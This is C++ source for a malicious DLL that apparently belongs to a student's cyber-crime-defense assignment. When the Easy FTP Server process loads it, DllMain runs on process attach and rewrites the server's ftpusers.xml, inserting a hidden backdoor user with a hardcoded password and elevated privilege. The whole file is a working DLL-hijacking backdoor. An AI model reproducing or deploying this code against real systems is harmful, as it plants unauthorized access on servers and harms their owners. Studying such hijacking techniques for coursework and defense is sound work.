#include "windows.h"
#include <iostream>
#include <fstream>
#include <string>

//In a lot of scenarios you usually have to declare some functions of the actual dll for the system to actually accept
//it as the real thing, but I seem to be lucky here since it do run my code when the server runs :)

void AppendUser(std::string folderPath)
{
    std::ifstream readUsers(folderPath + "ftpusers.xml");
    std::string fileContent = "";
    std::string line = "";

    while (std::getline (readUsers, line))
    {
        fileContent.append(line + '\n');
    }

    readUsers.close();
    int insertIndex = fileContent.find('\n');
    std::string username = "OscarCarlson";

    if(fileContent.find(username) == std::string::npos)
    {
        if(insertIndex != std::string::npos)
        {
            //set actual index, need to write right after newline
            insertIndex++;
            std::string password = "?CheeseHandler55";
            std::string alias = "oc";
            std::string privilege = "131074";
            std::string work_dir = "C:\\Users\\gabri\\MinaFiler\\CyberCrimeDefense\\Assignment1\\easyftpsvr-1.7.0.2\\OscarCarlson";
            std::string welcome_msg = "Hi there!";
            std::string disabled = "no";

            //the += is to solve a strange compilation error, idk how that's even possible
            std::string userEntry = "\t";
            userEntry += ("<user username=\"" + username + "\" password=\"" + password + "\" alias=\"" + alias +
                "\" privilege=\"" + privilege + "\" work_dir=\"" + work_dir + "\" welcome_msg=\"" + welcome_msg +
                "\" disabled=\"" + disabled + "\" />" + "\n");
            fileContent.insert(insertIndex, userEntry);

            std::ofstream writeUsers(folderPath + "ftpusers.xml");
            writeUsers << fileContent;
            writeUsers.close();
        }
    }
}

bool WINAPI DllMain(HANDLE hDLL, DWORD dwReason, LPVOID lpReserved)
{
    std::string folderPath = "C:\\Users\\gabri\\MinaFiler\\CyberCrimeDefense\\Assignment1\\easyftpsvr-1.7.0.2\\";

    switch(dwReason)
    {
        case DLL_PROCESS_ATTACH:
        {
            AppendUser(folderPath);
            break;
        }

        default:
        {
        }
    }

    return true;
}